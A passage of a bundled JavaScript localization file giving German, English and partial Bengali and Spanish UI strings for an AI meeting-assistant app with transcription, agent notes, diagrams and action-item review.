হচ্ছে…\",\"title\":\"অনুবাদ\"},\"widgetType\":{\"chat\":\"চ্যাট\",\"html\":\"চিত্র\",\"markdown\":\"নোট\"}}}"),
		components: { "confirmDialog": { "cancel": "বাতিল" } }
	},
	de: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"Die Ausgabe von {{name}} erscheint hier.\",\"cancel\":\"Abbrechen\",\"chatEmpty\":\"Noch nichts an {{name}} gesendet.\",\"collapse\":\"{{name}} wieder im geteilten Layout zeigen\",\"diagramFrameTitle\":\"Diagramm von {{name}}\",\"discardDraft\":\"Ungespeicherte Änderungen verwerfen\",\"discardDraftHint\":\"Ungespeicherte Änderungen werden endgültig gelöscht.\",\"edit\":\"Diese Ausgabe bearbeiten\",\"edited\":\"Bearbeitet\",\"editorLabel\":\"Ausgabe von {{name}}, bearbeitbar\",\"expand\":\"{{name}} vergrößern\",\"listeningHint\":\"Hört der Besprechung zu\",\"messagePlaceholder\":\"Nachricht an {{name}}…\",\"mute\":\"{{name}} stummschalten\",\"mutedHint\":\"Hört der Besprechung nicht zu\",\"revert\":\"Meine Änderungen verwerfen\",\"revertHint\":\"Meine Änderungen endgültig löschen und anzeigen, was {{name}} geschrieben hat\",\"save\":\"Speichern\",\"saving\":\"Wird gespeichert…\",\"send\":\"Senden\",\"showChat\":\"Chat anzeigen\",\"showOutput\":\"Ausgabe anzeigen\",\"staleEdit\":\"{{name}} hat seit deiner Bearbeitung weitergeschrieben. Angezeigt wird deine Version; verwirf deine Änderungen, um die andere zu sehen.\",\"unmute\":\"Stummschaltung von {{name}} aufheben\"},\"broadcastBar\":{\"heard\":\"Gehört: {{text}}\",\"pausedPlaceholder\":\"Agenten pausiert — zum Senden fortsetzen\",\"pausingPlaceholder\":\"Wird pausiert — Senden nicht möglich\",\"placeholder\":\"Etwas an alle zuhörenden Agenten sagen…\",\"resumingPlaceholder\":\"Wird fortgesetzt — Senden ist gleich wieder möglich\",\"send\":\"Senden\"},\"list\":{\"adHocTitle\":\"Spontane Besprechung\",\"deleteConfirm\":\"„{{title}}“ und alle Notizen, Diagramme und Aufgaben endgültig löschen? Dies kann nicht rückgängig gemacht werden.\",\"deleteFailed\":\"Diese Besprechung konnte nicht gelöscht werden.\",\"deleteMeeting\":\"{{title}} löschen\",\"deleteUnavailable\":\"Beenden Sie diese Besprechung, bevor Sie sie löschen\",\"deleted\":\"„{{title}}“ wurde gelöscht\",\"empty\":\"Keine Besprechungen\",\"emptyHintNoCalendar\":\"Verbinde in den Einstellungen einen Kalender oder starte eine spontane Besprechung.\",\"emptyHintSynced\":\"Nichts im Kalender, und noch keine Besprechung bearbeitet.\",\"filterPlaceholder\":\"Besprechungen filtern…\",\"hasNotes\":\"Hat Notizen\",\"liveBanner\":\"{{title}} läuft gerade\",\"newMeeting\":\"Neue Besprechung\",\"returnToMeeting\":\"Zurück zur Besprechung\",\"reviewing\":\"In Prüfung\",\"reviewingBanner\":\"{{title}} wartet auf die Prüfung der Aufgaben\",\"sectionTitle\":\"Alle Besprechungen\",\"settings\":\"Einstellungen\",\"statLive\":\"Live\",\"statScheduled\":\"Geplant\",\"statWorked\":\"Bearbeitet\",\"subtitle\":\"Notizen, Diagramme und Aufgaben live während der Besprechung\",\"syncCalendar\":\"Kalender synchronisieren\",\"syncFailed\":\"Der Kalender konnte nicht synchronisiert werden.\",\"synced_one\":\"{{count}} Termin synchronisiert\",\"synced_other\":\"{{count}} Termine synchronisiert\",\"title\":\"Besprechungen\"},\"manifest\":{\"configuration_1\":\"Erlaube dem Browser für die Live-Erfassung den Mikrofonzugriff; konfiguriere optional in den Einstellungen einen iCalendar-Pfad oder eine URL, das lokale Aufgaben-Ledger, Agentenrollen und Begriffe zur Spracherkennungskorrektur.\",\"description\":\"Ein KI-Assistent für Besprechungen. Transkribiert eine laufende Besprechung, führt dabei strukturierte Notizen und Diagramme, extrahiert Aufgaben und lässt dich sie prüfen, bevor sie angelegt werden.\",\"display_name\":\"Besprechungen\",\"highlight_1\":\"Live-Transkription über die eigene Sprache-zu-Text-Funktion von Kiro Crew — kein zusätzlicher Daemon, kein Cloud-Konto über das hinaus, was du schon nutzt\",\"highlight_2\":\"Ein Team von Agenten bearbeitet die Besprechung parallel: strukturierte Notizen, ein HTML/Mermaid-Diagramm und eine Aufgabenliste\",\"highlight_3\":\"Korrigiere wiederkehrende Fehler der Spracherkennung einmal mit einem Fachwörterbuch, und jede spätere Besprechung macht es richtig\",\"highlight_4\":\"Prüfe die extrahierten Aufgaben, bevor etwas angelegt wird — archiviere das Rauschen, lege den Rest an\",\"highlight_5\":\"Austauschbare Anbieter für Aufgaben und Kalender: enthalten sind ein lokales Aufgabenregister und ein iCalendar-Leser (.ics), und eine Organisation kann eigene registrieren\",\"highlight_6\":\"Lies das Transkript während des Meetings Zeile für Zeile in einer anderen Sprache mit\",\"highlight_7\":\"Führe deine eigenen Notizen neben denen der Agenten — füge einen Screenshot ein und er landet mit der bisherigen Meeting-Dauer\",\"page_label\":\"Besprechungen\",\"use_case_1\":\"Erfasse eine Live-Besprechung, während parallele Agenten Transkript, strukturierte Notizen, Diagramm und die Prüfung der Aufgaben erstellen.\"},\"meeting\":{\"agentsPaused\":\"Die Agenten haben nach mehreren Fehlern angehalten.\",\"attachPrompt\":\"Fügen Sie einen Link ein, den Sie mit den Agenten teilen möchten\",\"back\":\"Zurück\",\"endAndReview\":\"Beenden und prüfen\",\"ended\":\"Beendet\",\"endingReview\":\"Wird beendet — Rückblick wird vorbereitet…\",\"live\":\"Live\",\"loadFailed\":\"Diese Besprechung konnte nicht geöffnet werden\",\"moreActions\":\"Weitere Aktionen\",\"noAgents\":\"Keine Agenten aktiv\",\"noAgentsHint\":\"Aktiviere oben einen Agenten oder wähle eine Voreinstellung.\",\"pause\":\"Pausieren\",\"paused\":\"Pausiert\",\"pausing\":\"Wird pausiert…\",\"refresh\":\"Aktualisieren\",\"restart\":\"Neu starten\",\"resuming\":\"Wird fortgesetzt…\",\"retryAgents\":\"Erneut versuchen\",\"start\":\"Starten\",\"titleLabel\":\"Titel der Besprechung\",\"toggleNote\":\"Meine Notiz\",\"toggleTasks\":\"Aufgaben\",\"toggleTranslation\":\"Übersetzung\",\"unpause\":\"Fortsetzen\"},\"note\":{\"close\":\"Notiz schließen\",\"edit\":\"Bearbeiten\",\"editorLabel\":\"Notiztext\",\"hint\":\"Wird beim Schreiben automatisch gespeichert.\",\"loadFailed\":\"Deine Notiz konnte nicht von der Festplatte gelesen werden. Das Bearbeiten ist pausiert, damit nichts überschrieben wird – schließe das Panel und öffne es erneut, um es noch einmal zu versuchen.\",\"loading\":\"Deine Notiz wird geladen…\",\"paused\":\"Bearbeiten pausiert\",\"placeholder\":\"Schreib hier deine eigenen Notizen. Markdown wird unterstützt.\",\"preview\":\"Vorschau\",\"saved\":\"Gespeichert\",\"saving\":\"Wird gespeichert…\",\"title\":\"Meine Notiz\",\"unsaved\":\"Nicht gespeicherte Änderungen\",\"uploading\":\"Bild wird hinzugefügt…\"},\"pillBar\":{\"addLink\":\"Link hinzufügen\",\"agentMuted\":\"{{name}} hört nicht zu\",\"attachmentsMenu\":\"Anhänge\",\"createPreset\":\"Voreinstellung erstellen\",\"disableAgent\":\"{{name}} ausschalten\",\"enableAgent\":\"{{name}} einschalten\",\"listening\":\"Hört zu\",\"manageAgents\":\"Agenten verwalten\",\"manageAttachments\":\"Anhänge verwalten\",\"noAttachments\":\"Keine Anhänge\",\"noPreset\":\"Keine Voreinstellung\",\"presetDefaultOption\":\"{{name}} (Standard)\",\"presetLabel\":\"Agenten-Voreinstellung\",\"removeAttachment\":\"{{label}} entfernen\",\"usingDefaultPreset\":\"Standard-Voreinstellung wird verwendet\"},\"priority\":{\"high\":\"Hoch\",\"low\":\"Niedrig\",\"medium\":\"Mittel\"},\"review\":{\"allDone\":\"Alles geprüft\",\"archive\":\"Archivieren\",\"archiveAll\":\"Rest archivieren\",\"archiveOthers_one\":\"Die anderen {{count}} archivieren\",\"archiveOthers_other\":\"Die anderen {{count}} archivieren\",\"archiveSkipsFiling\":\"Einträge, die gerade abgelegt werden, bleiben ausgenommen\",\"archivedSection\":\"Archiviert\",\"assignedTo\":\"Zugewiesen an {{name}}\",\"backToMeeting\":\"Zurück zur Besprechung\",\"closeBlocked_one\":\"{{count}} braucht noch eine Entscheidung\",\"closeBlocked_other\":\"{{count}} brauchen noch eine Entscheidung\",\"closeMeeting\":\"Besprechung abschließen\",\"file\":\"Anlegen\",\"filedSection\":\"In {{provider}} angelegt\",\"filing\":\"Wird angelegt…\",\"nothingPending\":\"Nichts mehr zu prüfen\",\"nothingPendingHint\":\"Jede Aufgabe wurde angelegt oder archiviert.\",\"pendingSection\":\"Offen\",\"remaining_one\":\"noch {{count}} zu prüfen\",\"remaining_other\":\"noch {{count}} zu prüfen\",\"statArchived\":\"Archiviert\",\"statFiled\":\"Angelegt\",\"statPending\":\"Offen\",\"title\":\"Aufgabenprüfung\",\"unarchive\":\"Wiederherstellen\"},\"session\":{\"agentToggleFailed\":\"Dieser Agent konnte nicht geändert werden.\",\"agentsResumed\":\"Die Agenten laufen wieder.\",\"anotherMeetingActive\":\"Es läuft schon eine andere Besprechung. Beende sie zuerst.\",\"anotherMeetingActiveNamed\":\"„{{title}}“ läuft noch. Öffne sie in Besprechungen und wähle zuerst „Beenden und prüfen“.\",\"anotherMeetingReviewing\":\"„{{title}}“ ist noch in der Prüfung. Öffne sie in Besprechungen und wähle zuerst „Besprechung abschließen“.\",\"attachmentFailed\":\"Die Anhänge konnten nicht aktualisiert werden.\",\"broadcastFailed\":\"Die Agenten konnten nicht erreicht werden.\",\"broadcastSent\":\"An die zuhörenden Agenten gesendet.\",\"ended\":\"Besprechung beendet.\",\"messageFailed\":\"Diese Nachricht konnte nicht gesendet werden.\",\"minutesRevertFailed\":\"Deine Änderungen konnten nicht verworfen werden.\",\"minutesSaveFailed\":\"Deine Änderungen konnten nicht gespeichert werden.\",\"noteImageFailed\":\"Dieses Bild konnte nicht hinzugefügt werden. Füge ein PNG, JPEG, GIF oder WebP ein.\",\"noteImageTooLarge\":\"Dieses Bild ist zu groß für eine Notiz.\",\"noteSaveFailed\":\"Deine Notiz konnte nicht gespeichert werden.\",\"openVoiceSettings\":\"Spracheinstellungen öffnen\",\"renameFailed\":\"Die Besprechung konnte nicht umbenannt werden.\",\"startFailed\":\"Die Besprechung konnte nicht gestartet werden.\",\"started\":\"Besprechung gestartet.\",\"statusFailed\":\"Der Status der Besprechung konnte nicht geändert werden.\",\"stopFailed\":\"Die Besprechung konnte nicht beendet werden.\",\"sttConnectionFailed\":\"Es konnte keine Verbindung zur Transkription hergestellt werden.\",\"sttDisconnected\":\"Die Transkription wurde getrennt.\",\"sttDispatchFailed\":\"Ein Transkriptsegment konnte nicht an die Agenten übermittelt werden.\",\"sttMicDenied\":\"Der Zugriff auf das Mikrofon wurde verweigert.\",\"sttStreamingDisabled\":\"Live-Transkription ist aus. Prüfe unter Einstellungen → Sprache, dass die Spracheingabe aktiviert ist, der Anbieter Streaming kann und Streaming an ist.\",\"sttUnavailable\":\"Die Transkription ist nicht verfügbar.\",\"sttUnsupported\":\"Dieser Browser kann kein Audio aufnehmen.\",\"sttWorkletFailed\":\"Die Audioverarbeitung konnte nicht gestartet werden.\",\"taskAddFailed\":\"Diese Aufgabe konnte nicht hinzugefügt werden.\",\"taskFileFailed\":\"Diese Aufgabe konnte nicht angelegt werden.\",\"taskFiled\":\"Aufgabe angelegt.\",\"untitled\":\"Besprechung ohne Titel\"},\"settings\":{\"addTerm\":\"Hinzufügen\",\"agentsHelp\":\"Welche Agenten eine Besprechung anbietet und welche davon aktiviert starten.\",\"agentsTitle\":\"Agenten\",\"aliasesLabel\":\"Falsch gehörte Formen\",\"aliasesPlaceholder\":\"Was die Transkription hört, mit Komma getrennt…\",\"back\":\"Zurück\",\"calendarHelp\":\"Woher die anstehenden Besprechungen gelesen werden.\",\"calendarProviderLabel\":\"Kalenderanbieter\",\"calendarSourceHint\":\"Ein Pfad zu einer lokalen .ics-Datei oder eine https-URL dazu.\",\"calendarSourceLabel\":\"Kalenderquelle\",\"calendarSourcePlaceholder\":\"Pfad oder URL zu einer .ics-Datei…\",\"calendarTitle\":\"Kalender\",\"correctLabel\":\"Richtiger Begriff\",\"correctPlaceholder\":\"Was es heißen soll…\",\"dictionaryHelp\":\"Korrigiere einen wiederkehrenden Transkriptionsfehler einmal, dann sitzt er in jeder späteren Besprechung.\",\"dictionaryTitle\":\"Sprachwörterbuch\",\"enabledByDefault\":\"{{name}} standardmäßig aktivieren\",\"noTerms\":\"Noch keine Korrekturen\",\"noTermsHint\":\"Trage links ein, was die Transkription falsch hört, und rechts, was es heißen soll.\",\"removeTerm\":\"{{term}} entfernen\",\"saveFailed\":\"Die Einstellungen konnten nicht gespeichert werden.\",\"saveSource\":\"Speichern\",\"saved\":\"Gespeichert.\",\"subtitle\":\"Anbieter, Agenten und das Sprachwörterbuch\",\"taskProviderHelp\":\"Wo geprüfte Aufgaben angelegt werden.\",\"taskProviderTitle\":\"Aufgabenanbieter\",\"termFailed\":\"Diese Korrektur konnte nicht hinzugefügt werden.\",\"termIncomplete\":\"Gib ein, was gehört wurde und was es heißen soll.\",\"title\":\"Besprechungseinstellungen\",\"translationHelp\":\"Übersetzt jede gesprochene Zeile in eine andere Sprache und zeigt sie während des Meetings in einem Seitenbereich an. Kostet einen Modellaufruf pro Zeile und ist daher standardmäßig deaktiviert.\",\"translationOff\":\"Aus\",\"translationTitle\":\"Live-Übersetzung\"},\"taskSidebar\":{\"add\":\"Hinzufügen\",\"assigneeLabel\":\"Zuständig\",\"close\":\"Aufgaben schließen\",\"deleteTask\":\"Diese Aufgabe löschen\",\"descriptionLabel\":\"Aufgabe\",\"empty\":\"Noch nichts erkannt.\",\"filed\":\"Angelegt\",\"heading_one\":\"{{count}} Aufgabe\",\"heading_other\":\"{{count}} Aufgaben\",\"priorityLabel\":\"Priorität\",\"quickAddPlaceholder\":\"Aufgabe hinzufügen…\",\"title\":\"Aufgaben\",\"unassigned\":\"Nicht zugewiesen\"},\"transcript\":{\"empty\":\"Noch kein Transkript\",\"emptyHintLive\":\"Final erkannte Sprache erscheint hier im Verlauf der Besprechung.\",\"emptyHintPaused\":\"Pausiert — Sprache erscheint hier nach dem Fortsetzen.\",\"emptyHintRecorded\":\"Für diese Besprechung wurde kein Transkript aufgezeichnet.\",\"full\":\"Das Transkript ist voll. Neue Sprache und Mitteilungen werden nicht mehr aufgezeichnet oder an Agenten gesendet.\",\"jumpToLatest\":\"Zum neuesten Eintrag\",\"live\":\"Live\",\"regionLabel\":\"Besprechungstranskript\",\"title\":\"Transkript\",\"typed\":\"Eingegeben\"},\"translation\":{\"close\":\"Übersetzung schließen\",\"dropped\":\"Einige Zeilen wurden übersprungen, um mitzuhalten.\",\"empty\":\"Noch nichts übersetzt\",\"emptyHint\":\"Zeilen erscheinen hier, sobald gesprochen wird.\",\"lineFailed\":\"Diese Zeile konnte nicht übersetzt werden.\",\"loading\":\"Wird geladen…\",\"pending\":\"Wird aufgeholt…\",\"title\":\"Übersetzung\"},\"widgetType\":{\"chat\":\"Chat\",\"html\":\"Diagramm\",\"markdown\":\"Notizen\"}}}"),
		components: { "confirmDialog": { "cancel": "Abbrechen" } }
	},
	en: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"{{name}} output will appear here.\",\"cancel\":\"Cancel\",\"chatEmpty\":\"Nothing sent to {{name}} yet.\",\"collapse\":\"Restore {{name}} to the side-by-side layout\",\"diagramFrameTitle\":\"{{name}} diagram\",\"discardDraft\":\"Discard unsaved changes\",\"discardDraftHint\":\"Your unsaved changes will be permanently deleted.\",\"edit\":\"Edit this output\",\"edited\":\"Edited\",\"editorLabel\":\"{{name}} output, editable\",\"expand\":\"Expand {{name}}\",\"listeningHint\":\"Listening to the meeting\",\"messagePlaceholder\":\"Message {{name}}…\",\"mute\":\"Mute {{name}}\",\"mutedHint\":\"Not listening to the meeting\",\"revert\":\"Discard my edits\",\"revertHint\":\"Permanently delete my edits and show what {{name}} wrote\",\"save\":\"Save\",\"saving\":\"Saving…\",\"send\":\"Send\",\"showChat\":\"Show chat\",\"showOutput\":\"Show output\",\"staleEdit\":\"{{name}} has written more since you edited this. Your version is shown; discard your edits to see theirs.\",\"unmute\":\"Unmute {{name}}\"},\"broadcastBar\":{\"heard\":\"Heard: {{text}}\",\"pausedPlaceholder\":\"Agents paused — resume to send\",\"pausingPlaceholder\":\"Pausing — sending is unavailable\",\"placeholder\":\"Say something to every listening agent…\",\"resumingPlaceholder\":\"Resuming — sending will be available shortly\",\"send\":\"Send\"},\"list\":{\"adHocTitle\":\"Ad-hoc meeting\",\"deleteConfirm\":\"Delete “{{title}}” and all of its notes, diagrams, and action items? This cannot be undone.\",\"deleteFailed\":\"Could not delete this meeting.\",\"deleteMeeting\":\"Delete {{title}}\",\"deleteUnavailable\":\"End this meeting before deleting it\",\"deleted\":\"Deleted “{{title}}”\",\"empty\":\"No meetings\",\"emptyHintNoCalendar\":\"Connect a calendar in settings, or start an ad-hoc meeting.\",\"emptyHintSynced\":\"Nothing on the calendar, and no meeting worked on yet.\",\"filterPlaceholder\":\"Filter meetings…\",\"hasNotes\":\"Has notes\",\"liveBanner\":\"{{title}} is live\",\"newMeeting\":\"New meeting\",\"returnToMeeting\":\"Return to the meeting\",\"reviewing\":\"Reviewing\",\"reviewingBanner\":\"{{title}} is waiting on an action-item review\",\"sectionTitle\":\"All meetings\",\"settings\":\"Settings\",\"statLive\":\"Live\",\"statScheduled\":\"Scheduled\",\"statWorked\":\"Worked on\",\"subtitle\":\"Live notes, diagrams, and action items while the meeting happens\",\"syncCalendar\":\"Sync calendar\",\"syncFailed\":\"Could not sync the calendar.\",\"synced_one\":\"Synced {{count}} event\",\"synced_other\":\"Synced {{count}} events\",\"title\":\"Meetings\"},\"manifest\":{\"configuration_1\":\"Allow browser microphone access for live capture; optionally configure an iCalendar path or URL, the local task ledger, agent roles, and speech-correction terms in Settings.\",\"description\":\"An AI meeting assistant. Transcribes a live meeting, keeps structured notes and diagrams as it goes, extracts action items, and lets you review them before filing.\",\"display_name\":\"Meetings\",\"highlight_1\":\"Live transcription through Kiro Crew's own speech-to-text — no extra daemon, no cloud account beyond what you already use\",\"highlight_2\":\"A crew of agents works the meeting in parallel: structured notes, an HTML/Mermaid diagram, and an action-item list\",\"highlight_3\":\"Correct recurring speech-to-text mistakes once with a domain dictionary and every later meeting gets them right\",\"highlight_4\":\"Review extracted action items before anything is filed — archive the noise, file the rest\",\"highlight_5\":\"Pluggable task and calendar providers: ships a local task ledger and an iCalendar (.ics) reader, and an organization can register its own\",\"highlight_6\":\"Read the transcript back line by line in another language while the meeting runs\",\"highlight_7\":\"Keep your own notes beside the agents' — paste a screenshot and it lands with the meeting's elapsed time\",\"page_label\":\"Meetings\",\"use_case_1\":\"Capture a live meeting while parallel agents build the transcript, structured notes, diagram, and action-item review.\"},\"meeting\":{\"agentsPaused\":\"The agents stopped after repeated failures.\",\"attachPrompt\":\"Paste a link to share with the agents\",\"back\":\"Back\",\"endAndReview\":\"End and review\",\"ended\":\"Ended\",\"endingReview\":\"Ending — preparing review…\",\"live\":\"Live\",\"loadFailed\":\"Could not open this meeting\",\"moreActions\":\"More actions\",\"noAgents\":\"No agents enabled\",\"noAgentsHint\":\"Turn one on in the bar above, or pick a preset.\",\"pause\":\"Pause\",\"paused\":\"Paused\",\"pausing\":\"Pausing…\",\"refresh\":\"Refresh\",\"restart\":\"Restart\",\"resuming\":\"Resuming…\",\"retryAgents\":\"Retry\",\"start\":\"Start\",\"titleLabel\":\"Meeting title\",\"toggleNote\":\"My note\",\"toggleTasks\":\"Action items\",\"toggleTranslation\":\"Translation\",\"unpause\":\"Resume\"},\"note\":{\"close\":\"Close note\",\"edit\":\"Edit\",\"editorLabel\":\"Note text\",\"hint\":\"Saves automatically as you type.\",\"loadFailed\":\"Could not read your note from disk. Editing is paused so nothing is written over it — close and reopen the panel to try again.\",\"loading\":\"Loading your note…\",\"paused\":\"Editing paused\",\"placeholder\":\"Type your own notes here. Markdown works.\",\"preview\":\"Preview\",\"saved\":\"Saved\",\"saving\":\"Saving…\",\"title\":\"My note\",\"unsaved\":\"Unsaved changes\",\"uploading\":\"Adding image…\"},\"pillBar\":{\"addLink\":\"Add a link\",\"agentMuted\":\"{{name}} is not listening\",\"attachmentsMenu\":\"Attachments\",\"createPreset\":\"Create a preset\",\"disableAgent\":\"Turn {{name}} off\",\"enableAgent\":\"Turn {{name}} on\",\"listening\":\"Listening\",\"manageAgents\":\"Manage agents\",\"manageAttachments\":\"Manage attachments\",\"noAttachments\":\"No attachments\",\"noPreset\":\"No preset\",\"presetDefaultOption\":\"{{name}} (default)\",\"presetLabel\":\"Agent preset\",\"removeAttachment\":\"Remove {{label}}\",\"usingDefaultPreset\":\"Using the default preset\"},\"priority\":{\"high\":\"High\",\"low\":\"Low\",\"medium\":\"Medium\"},\"review\":{\"allDone\":\"All reviewed\",\"archive\":\"Archive\",\"archiveAll\":\"Archive the rest\",\"archiveOthers_one\":\"Archive the other {{count}}\",\"archiveOthers_other\":\"Archive the other {{count}}\",\"archiveSkipsFiling\":\"Items being filed are skipped\",\"archivedSection\":\"Archived\",\"assignedTo\":\"Assigned to {{name}}\",\"backToMeeting\":\"Back to the meeting\",\"closeBlocked_one\":\"{{count}} still needs a decision\",\"closeBlocked_other\":\"{{count}} still need a decision\",\"closeMeeting\":\"Close the meeting\",\"file\":\"File\",\"filedSection\":\"Filed to {{provider}}\",\"filing\":\"Filing…\",\"nothingPending\":\"Nothing left to review\",\"nothingPendingHint\":\"Every action item has been filed or archived.\",\"pendingSection\":\"Pending\",\"remaining_one\":\"{{count}} left to review\",\"remaining_other\":\"{{count}} left to review\",\"statArchived\":\"Archived\",\"statFiled\":\"Filed\",\"statPending\":\"Pending\",\"title\":\"Action item review\",\"unarchive\":\"Restore\"},\"session\":{\"agentToggleFailed\":\"Could not change that agent.\",\"agentsResumed\":\"The agents are running again.\",\"anotherMeetingActive\":\"Another meeting is already running. End it first.\",\"anotherMeetingActiveNamed\":\"“{{title}}” is still running. Open it in Meetings and choose End and review first.\",\"anotherMeetingReviewing\":\"“{{title}}” is still in review. Open it in Meetings and choose Close the meeting first.\",\"attachmentFailed\":\"Could not update the attachments.\",\"broadcastFailed\":\"Could not reach the agents.\",\"broadcastSent\":\"Sent to the listening agents.\",\"ended\":\"Meeting ended.\",\"messageFailed\":\"Could not send that message.\",\"minutesRevertFailed\":\"Could not discard your edits.\",\"minutesSaveFailed\":\"Could not save your edits.\",\"noteImageFailed\":\"Could not add that image. Paste a PNG, JPEG, GIF or WebP.\",\"noteImageTooLarge\":\"That image is too large to add to a note.\",\"noteSaveFailed\":\"Could not save your note.\",\"openVoiceSettings\":\"Open Voice settings\",\"renameFailed\":\"Could not rename the meeting.\",\"startFailed\":\"Could not start the meeting.\",\"started\":\"Meeting started.\",\"statusFailed\":\"Could not change the meeting status.\",\"stopFailed\":\"Could not end the meeting.\",\"sttConnectionFailed\":\"Could not connect to transcription.\",\"sttDisconnected\":\"Transcription disconnected.\",\"sttDispatchFailed\":\"A transcript segment could not be delivered to the agents.\",\"sttMicDenied\":\"Microphone access was denied.\",\"sttStreamingDisabled\":\"Live transcription is off. In Settings → Voice, check that speech input is enabled, the provider can stream, and Streaming is on.\",\"sttUnavailable\":\"Transcription is unavailable.\",\"sttUnsupported\":\"This browser cannot record audio.\",\"sttWorkletFailed\":\"Could not start the audio processor.\",\"taskAddFailed\":\"Could not add that action item.\",\"taskFileFailed\":\"Could not file that action item.\",\"taskFiled\":\"Action item filed.\",\"untitled\":\"Untitled meeting\"},\"settings\":{\"addTerm\":\"Add\",\"agentsHelp\":\"Which agents a meeting offers, and which of them start enabled.\",\"agentsTitle\":\"Agents\",\"aliasesLabel\":\"Misheard forms\",\"aliasesPlaceholder\":\"What transcription hears, comma-separated…\",\"back\":\"Back\",\"calendarHelp\":\"Where upcoming meetings are read from.\",\"calendarProviderLabel\":\"Calendar provider\",\"calendarSourceHint\":\"A path to a local .ics file, or an https URL to one.\",\"calendarSourceLabel\":\"Calendar source\",\"calendarSourcePlaceholder\":\"Path or URL to an .ics file…\",\"calendarTitle\":\"Calendar\",\"correctLabel\":\"Correct term\",\"correctPlaceholder\":\"What it should say…\",\"dictionaryHelp\":\"Fix a recurring transcription mistake once and every later meeting gets it right.\",\"dictionaryTitle\":\"Speech dictionary\",\"enabledByDefault\":\"Enable {{name}} by default\",\"noTerms\":\"No corrections yet\",\"noTermsHint\":\"Add what transcription mishears on the left, and what it should say on the right.\",\"removeTerm\":\"Remove {{term}}\",\"saveFailed\":\"Could not save the settings.\",\"saveSource\":\"Save\",\"saved\":\"Saved.\",\"subtitle\":\"Providers, agents, and the speech dictionary\",\"taskProviderHelp\":\"Where reviewed action items are filed.\",\"taskProviderTitle\":\"Task provider\",\"termFailed\":\"Could not add that correction.\",\"termIncomplete\":\"Enter what was heard and what it should say.\",\"title\":\"Meetings settings\",\"translationHelp\":\"Translate each spoken line into another language, shown in a side panel during the meeting. Costs one model call per line, so it is off by default.\",\"translationOff\":\"Off\",\"translationTitle\":\"Live translation\"},\"taskSidebar\":{\"add\":\"Add\",\"assigneeLabel\":\"Assignee\",\"close\":\"Close the action items\",\"deleteTask\":\"Delete this action item\",\"descriptionLabel\":\"Action item\",\"empty\":\"Nothing extracted yet.\",\"filed\":\"Filed\",\"heading_one\":\"{{count}} action item\",\"heading_other\":\"{{count}} action items\",\"priorityLabel\":\"Priority\",\"quickAddPlaceholder\":\"Add an action item…\",\"title\":\"Action items\",\"unassigned\":\"Unassigned\"},\"transcript\":{\"empty\":\"No transcript yet\",\"emptyHintLive\":\"Final speech will appear here as the meeting continues.\",\"emptyHintPaused\":\"Paused — speech will appear here after you resume.\",\"emptyHintRecorded\":\"No transcript was recorded for this meeting.\",\"full\":\"Transcript is full. New speech and broadcasts are no longer being recorded or sent to agents.\",\"jumpToLatest\":\"Jump to latest\",\"live\":\"Live\",\"regionLabel\":\"Meeting transcript\",\"title\":\"Transcript\",\"typed\":\"Typed\"},\"translation\":{\"close\":\"Close translation\",\"dropped\":\"Some lines were skipped to keep up.\",\"empty\":\"Nothing translated yet\",\"emptyHint\":\"Lines appear here as they are spoken.\",\"lineFailed\":\"Could not translate this line.\",\"loading\":\"Loading…\",\"pending\":\"Catching up…\",\"title\":\"Translation\"},\"widgetType\":{\"chat\":\"Chat\",\"html\":\"Diagram\",\"markdown\":\"Notes\"}}}"),
		components: { "confirmDialog": { "cancel": "Cancel" } }
	},
	es: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"La salida de {{name}} aparecerá aquí.\",\"cancel\":\"Cancelar\",\"chatEmpty\":\"Aún no se ha enviado nada a {{name}}.\",\"collapse\":\"Restaurar {{name}} al diseño dividido\",\"diagramFrameTitle\":\"Diagrama de {{name}}\",\"discardDraft\":\"Descartar los cambios sin guardar\",\"discardDraftHint\":\"Los cambios sin guardar se eliminarán permanentemente.\",\"edit\":\"Editar esta salida\",\"edited\":\"Editado\",\"editorLabel\":\"Salida de {{name}}, editable\",\"expand\":\"Ampliar {{name}}\",\"listeningHint\":\"Está escuchando la reunión\",\"messagePlaceholder\":\"Mensaje para {{name}}…\",\"mute\":\"Silenciar a {{name}}\",\"mutedHint\":\"No está escuchando la reunión\",\"revert\":\"Descartar mis cambios\",\"revertHint\":\"Eliminar permanentemente mis cambios y mostrar lo que escribió {{name}}\",\"save\":\"Guardar\",\"saving\":\"Guardando…\",\"send\":\"Enviar\",\"showChat\":\"Mostrar el chat\",\"showOutput\":\"Mostrar la salida\",\"staleEdit\":\"{{name}} ha escrito más desde que editaste esto. Se muestra tu versión; descarta tus cambios para ver la suya.\",\"unmute\":\"Reactivar a {{name}}\"},\"broadcastBar\":{\"heard\":\"Se oyó: {{text}}\",\"pausedPlaceholder\":\"Agentes en pausa — reanuda para enviar\",\"pausingPlaceholder\":\"Pausando — no se puede enviar\",\"placeholder\":\"Di algo a todos los agentes que escuchan…\",\"resumingPlaceholder\":\"Reanudando — pronto se podrá enviar\",\"send\":\"Enviar\"},\"list\":{\"adHocTitle\":\"Reunión improvisada\",\"deleteConfirm\":\"¿Eliminar “{{title}}” y todas sus notas, diagramas y tareas? Esta acción no se puede deshacer.\",\"deleteFailed\":\"No se pudo eliminar esta reunión.\",\"deleteMeeting\":\"Eliminar {{title}}\",\"deleteUnavailable\":\"Finaliza esta reunión antes de eliminarla\",\"deleted\":\"Se eliminó “{{title}}”\",\"empty\":\"Sin reuniones\",\"emptyHintNoCalendar\":\"Conecta un calendario en los ajustes, o empieza una reunión improvisada.\",\"emptyHintSynced\":\"Nada en el calendario, y ninguna reunión trabajada todavía.\",\"filterPlaceholder\":\"Filtrar reuniones…\",\"hasNotes\":\"Tiene notas\",\"liveBanner\":\"{{title}} está en directo\",\"newMeeting\":\"Nueva reunión\",\"returnToMeeting\":\"Volver a la reunión\",\"reviewing\":\"En revisión\",\"reviewingBanner\":\"{{title}} espera la revisión de las tareas\",\"sectionTitle\":\"Todas las reuniones\",\"settings\":\"Ajustes\",\"statLive\":\"En directo\",\"statScheduled\":\"Programadas\",\"statWorked\":\"Trabajadas\",\"subtitle\":\"Notas, diagramas y tareas en vivo mientras ocurre la reunión\",\"syncCalendar\":\"Sincronizar el calendario\",\"syncFailed\":\"No se pudo sincronizar el calendario.\",\"synced_many\":\"{{count}} eventos 